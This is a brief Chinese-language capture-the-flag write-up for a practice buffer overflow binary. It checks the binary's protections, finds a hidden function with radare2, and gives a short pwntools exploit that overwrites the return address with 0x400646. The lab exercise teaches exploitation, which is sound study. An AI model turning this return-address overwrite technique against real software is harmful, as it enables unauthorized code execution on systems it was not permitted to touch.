首先確認有哪些安全選項有開啟   
![Kali-Linux-2021 2-vmware-amd64-2021-12-19-22-33-24](https://user-images.githubusercontent.com/91378841/146678757-a79ff416-c52b-45de-bca5-ad2561bb6146.png)
發現到Stack, PIE是關的   
而題目中也告訴我們是Buffer Overflow   
![image](https://user-images.githubusercontent.com/91378841/146678878-7204e8b6-fbd5-443d-a7bf-618309dc56e5.png)   
透過r2發現到特別的function   
![image](https://user-images.githubusercontent.com/91378841/146678836-65de2270-8d33-4459-a22c-2b58fe345ffe.png)   
位置為0x400646
![image](https://user-images.githubusercontent.com/91378841/146679027-cec17fbd-baac-4654-9771-2fbd5c6a89d9.png)   
那我們目標即是讓程式覆蓋到Return Address
![image](https://user-images.githubusercontent.com/91378841/146679167-11c7298c-fdd3-4c7c-905c-ed3ab6d19975.png)
撰寫exploit code如下:   
```python
from pwn import *

r=process("./bofe4sy")
payload = b'a'*40
r.sendlineafter(':',payload+p64(0x400646))
r.interactive()
```
![image](https://user-images.githubusercontent.com/91378841/146679524-9bab67df-1b07-4d1c-be6c-7b410957053e.png)
